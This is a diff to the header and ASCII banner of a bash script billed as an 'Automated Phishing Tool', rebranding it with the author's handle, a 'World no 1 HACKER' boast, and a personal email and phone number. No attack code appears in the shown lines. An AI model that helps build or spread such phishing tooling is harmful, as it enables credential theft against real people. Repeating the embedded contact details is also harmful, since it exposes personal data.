@@ -1,7 +1,7 @@
 #!/bin/bash
 
 ##   zainnaveed 	: 	Automated Phishing Tool
-##   Author 	        : 	Zain Naveed
+##   Author 	        : 	ZainNaveed34211
 ##   Version 	        : 	2.3.5
 ##   Github       	: 	https://github.com/ZainNaveed34211/zainnaveed
 
@@ -194,15 +194,16 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${RED}    _____________                      ___________
-		${RED}                 /             /\           1              /\          Tik Tok:meharzain34211
-		${BLUE}              /             /   \          1             /  \
-		${BLUE}            /              /     \         1            /    \
-		${GREEN}          /              /       \        1            /     \
-		${GREEN}         /               /_______ \       1           /       \     /
-		${ORANGE}     /                 /         \       1          /         \   /
-		${ORANGE}     / ___________   /           \  _____1______   /            \/        
-		${RED}                  ${RED}Version : ${__version__}
+		${RED}  Z    World no 1 HACKER
+		${RED}  A    Tik Tok : meharzain34211
+		${RED}  I     Email: zainnaveed34211@gmail.com 
+		${RED}  N     Phone: 03471581246
+		${RED}  N    
+		${RED}  A      A PHISHING TOOL FOR HACKING
+		${RED}  V            (FREE)
+		${RED}  E               Enjoy!
+                ${RED}  E
+		${RED}  D               ${RED}Version : ${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by ZainNaveed34211 (zainnaveed)${WHITE}
 	EOF
